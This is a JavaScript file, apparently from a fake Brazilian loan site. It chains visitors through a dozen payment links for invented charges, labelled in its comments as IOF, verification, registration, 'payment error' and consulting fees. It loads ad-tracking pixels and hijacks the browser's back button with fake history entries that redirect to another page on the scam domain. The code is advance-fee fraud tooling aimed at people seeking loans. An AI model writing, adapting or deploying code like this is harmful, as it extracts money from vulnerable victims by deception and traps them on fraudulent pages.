const baseLinks = {
  up1: "https://pay.checkpagueseguro.site/DPXw3XxDpL93zmp", // IOF
  up2: "https://pay.checkpagueseguro.site/N1nVZparYQWGlM6", // Taxa de verificação de IOF
  up3: "https://pay.checkpagueseguro.site/2wq7GrlR44D3BAN", // Seguro Prestamista "tarifa de cadastro"
  up4: "https://pay.checkpagueseguro.site/P5LNZ8p0waOZaRy", // NFe
  up5: "https://pay.checkpagueseguro.site/rn4RgQV8Abl3wBV", // Ativar conta
  up6: "https://pay.checkpagueseguro.site/yOeXZK7EeNxZAQa", // Taxa de registro do contrato
  up7: "https://pay.checkpagueseguro.site/zj6aGnWVPDkgwlK", // Parabéns, 20k adicional
  up8: "https://pay.checkpagueseguro.site/zj6aGnWVPDkgwlK", // Erro no pagamento - 14,06
  up9: "https://pay.checkpagueseguro.site/rn4RgQ6lmM83wBV", // APP - 11,99
  up10: "https://pay.checkpagueseguro.site/JqoR32WyE1JZVj5", // Taxa de Abertura TAC - 16,92
  up11: "https://pay.checkpagueseguro.site/BNjzgP6oxqJZM78", // Taxa de Consultoria Financeira - 19,53
  up12: "https://pay.checkpagueseguro.site/KV603kVjzlEgw8y", // Taxa de Processamento Administrativo - 31,92
};

function redirect(key) {
  try {
    if (!baseLinks[key]) {
      throw new Error(`Link para ${key} não encontrado!`);
    }

    const url = new URL(baseLinks[key]);
    url.search = new URLSearchParams(window.location.search).toString();

    window.location.href = url.href;
  } catch (error) {
    console.error("Erro no redirecionamento:", error);
    alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
  }
}

// UTMIFY, troque o pixel só aqui, belê?
(function () {
  window.pixelId = "6818447034a3779352d0228a";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
})();

(function () {
  const script = document.createElement("script");

  script.src = "https://cdn.utmify.com.br/scripts/utms/latest.js";
  script.setAttribute("data-utmify-prevent-xcod-sck", "");
  script.setAttribute("data-utmify-prevent-subids", "");
  script.async = true;
  script.defer = true;

  document.head.appendChild(script);
})();

const backRedirectBackLink =
  "https://agilemprestimosoficial.site/agil-type-vega/up/back/";

// Adiciona duas entradas no histórico para capturar a navegação para trás
history.pushState({}, "", location.href);
history.pushState({}, "", location.href);

// Captura o evento de navegação para trás e redireciona
window.onpopstate = function () {
  setTimeout(() => {
    location.href = backRedirectBackLink;
  }, 1);
};
